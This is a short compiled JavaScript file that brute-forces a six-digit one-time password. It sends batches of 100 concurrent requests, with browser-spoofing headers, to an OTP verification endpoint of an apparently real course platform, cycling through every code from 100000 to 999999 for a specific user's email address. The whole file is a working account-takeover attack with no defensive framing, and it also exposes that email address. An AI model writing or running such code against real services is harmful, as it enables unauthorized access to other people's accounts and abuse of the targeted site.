"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let config = {
            method: "get",
            maxBodyLength: Infinity,
            url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=rg5353070%40gmail.com&otp=${otp}`,
            headers: {
                accept: "*/*",
                "accept-language": "en-US,en;q=0.9",
                "auth-key": "appxapi",
                "client-service": "Appx",
                "device-type": "",
                origin: "https://harkirat.classx.co.in",
                priority: "u=1, i",
                referer: "https://harkirat.classx.co.in/",
                "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                source: "website",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            },
        };
        try {
            const response = yield axios_1.default.request(config);
            // console.log(response.data);
        }
        catch (error) {
            // console.error(error);
        }
    });
}
// sendRequest("123456");
function initiateRequest() {
    return __awaiter(this, void 0, void 0, function* () {
        // write  a batch request 100 at a time
        for (let i = 100000; i <= 999999; i += 100) {
            let p = [];
            console.log(i);
            for (let j = 0; j < 100; j++) {
                p.push(sendRequest((i + j).toString()));
            }
            yield Promise.all(p);
        }
    });
}
initiateRequest();
("https://harkiratapi.classx.co.in/get/otpverify?useremail=rg5353070%40gmail.com&otp=213123112");
